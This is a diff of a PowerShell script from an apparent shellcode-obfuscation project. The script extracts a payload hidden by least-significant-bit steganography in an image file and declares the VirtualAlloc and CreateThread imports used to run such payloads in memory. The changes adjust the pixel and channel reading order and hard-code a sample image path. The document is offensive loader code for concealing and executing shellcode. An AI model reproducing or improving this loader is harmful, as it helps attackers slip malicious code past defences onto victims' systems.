@@ -1,9 +1,8 @@
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
-$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
 
-# [string] $filename = ".\samples\howareyou.bmp"
-[string] $filename = ".\samples\helpme.bmp"
+
+[string] $filename = "C:\Users\Blackberry\Desktop\projects\yet-another-shellcode-obfuscator\samples\helpme_x64.png"
 [Int32] $length = 2208
 
 $MethodDefinition =
@@ -14,6 +13,7 @@ public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwSta
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 '@
 
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
 
 function get_lsb([byte]$target, [byte]$source) { 
     $a = $target -shl 1
@@ -26,16 +26,15 @@ function get_payload($length) {
     $BitMap = [System.Drawing.Image]::FromFile((Get-Item $filename).fullname, $true)
     $bytes = New-Object byte[] ($length)
 
-    foreach($y in (($BitMap.Height-1)..0)) {
+    foreach($y in (0..($BitMap.Height-1))) {
         foreach($x in (0..($BitMap.Width-1))) {
             $Pixel = $BitMap.GetPixel($x,$y)
-            $B = $Pixel | Select-Object -ExpandProperty B
-            $G = $Pixel | Select-Object -ExpandProperty G
             $R = $Pixel | Select-Object -ExpandProperty R
+            $G = $Pixel | Select-Object -ExpandProperty G
+            $B = $Pixel | Select-Object -ExpandProperty B
+           
 
-            # "($B, $G, $R)"
-            
-            foreach ($byte in ($B, $G, $R)) {
+            foreach ($byte in ($R, $G, $B)) {  
                 if ($length -le 0) {
                     return $bytes
                 }
